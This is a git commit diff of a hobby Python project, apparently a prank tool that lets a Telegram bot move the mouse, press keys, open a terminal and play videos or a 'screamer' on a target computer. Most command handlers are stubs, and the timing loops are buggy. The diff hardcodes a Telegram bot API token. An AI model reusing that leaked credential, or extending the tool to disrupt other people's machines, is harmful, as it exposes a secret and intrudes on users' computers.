b3d399a75d210a14c8c3ba623ce2c261a00c6080
ivkrak <iv.krak@gmail.com>
2023-04-01 01:58:54 +0800

    БОЛЬ

--- ASS_hack/main.py
+++ ASS_hack/main.py
@@ -5,6 +5,7 @@ import time
 import random
 import pyautogui
 
+
 def play_youtube_video(link, runtime):
     start_time = time.time()
     while time.time < start_time + runtime:
@@ -35,17 +36,19 @@ def open_terminal(runtime):
         time.sleep(0.5)
         keyboard.press('Enter')
 
+
 def press_space_at_random(runtime):
     runtime = 200 if runtime < 200 else runtime
     start_time = time.time()
     while time.time < start_time + runtime:
-        time.sleep(random.randrange(2,10))
+        time.sleep(random.randrange(2, 10))
         keyboard.press('space')
+
 
 def chaotic_mouse_movement(runtime):
     runtime = 100 if runtime < 100 else runtime
     start_time = time.time()
     width, height = pyautogui.size()
     while time.time < start_time + runtime:
-        time.sleep(random.randrange(2,10))
+        time.sleep(random.randrange(2, 10))
         pyautogui.moveTo(random.randrange(width), random.randrange(height), duration=2.0)
--- bot/main.py
+++ bot/main.py
@@ -1,29 +1,33 @@
 from aiogram import Bot, Dispatcher, executor, types
 from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
-
+from ASS_hack.main import *
 API_TOKEN = '6172233586:AAF1EdyToa0DpWc3JNgDvfDQGXnrXKkFVxw'
 bot = Bot(token=API_TOKEN)
 dp = Dispatcher(bot)
 
+Список_комманд = '''
+Тут
+будет
+список
+команд
+'''
 
 @dp.message_handler(commands=['start', 'help', 'restart'])
 async def welcome(message: types.Message):
-    rq = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False)
-    rq.add(KeyboardButton('Запуск видео'))
-    rq.add(KeyboardButton('Выдать скриммер'))
     await message.reply(
         'Привет, устроим взлом ЖЕПЫ?)'
     )
     await bot.send_sticker(chat_id=message.chat.id,
-                           sticker='CAACAgIAAxkBAAEIZwNkJxJjU8kQVV4oulNFb2Ddwiy51wAC1AoAAuhO8Uh29Jn8lOf2ii8E',
-                           reply_markup=rq
-                           )
+                           sticker='CAACAgIAAxkBAAEIZwNkJxJjU8kQVV4oulNFb2Ddwiy51wAC1AoAAuhO8Uh29Jn8lOf2ii8E')
+    await bot.send_message(chat_id=message.chat.id, text=Список_комманд)
 
 
 @dp.message_handler()
 async def asshack(message: types.message):
-    match message.text:
-        case 'Запуск видео':
+    command, params = str(message.text).split(';')
+    params = list(map(str, params.split('|')))
+    match command:
+        case 'Открыть терминал':
             pass
         case 'Выдать скриммер':
             pass
